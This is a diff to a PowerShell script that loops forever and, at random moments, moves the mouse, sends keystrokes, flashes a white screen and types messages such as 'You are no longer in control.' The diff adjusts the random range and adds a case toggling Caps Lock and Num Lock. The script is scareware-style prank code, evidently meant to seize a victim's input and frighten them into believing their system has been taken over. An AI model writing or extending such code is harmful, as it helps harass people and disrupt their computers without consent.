@@ -24,7 +24,7 @@ $messages = @("System lockdown in progress...", "You are no longer in control.",
 while ($true) {
     Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
 
-    $random = Get-Random -Minimum 1 -Maximum 25
+    $random = Get-Random -Minimum 1 -Maximum 20
     switch ($random) {
         1 {  # AI-Controlled Mouse
             for ($i=0; $i -lt 20; $i++) {
@@ -113,7 +113,7 @@ while ($true) {
             $wshell.SendKeys("^{ESC}")
         }
         18 {  # Spam Random Keyboard Inputs
-            $wshell.SendKeys($messages | Get-Random)
+            $wshell.SendKeys(($messages | Get-Random))
         }
         19 {  # Flash White Screen
             Add-Type -AssemblyName System.Windows.Forms
@@ -125,6 +125,10 @@ while ($true) {
             $form.Show()
             Start-Sleep -Milliseconds 200
             $form.Close()
+        }
+        20 {  # Toggle Caps Lock & Num Lock
+            $wshell.SendKeys("{CAPSLOCK}")
+            $wshell.SendKeys("{NUMLOCK}")
         }
     }
 }
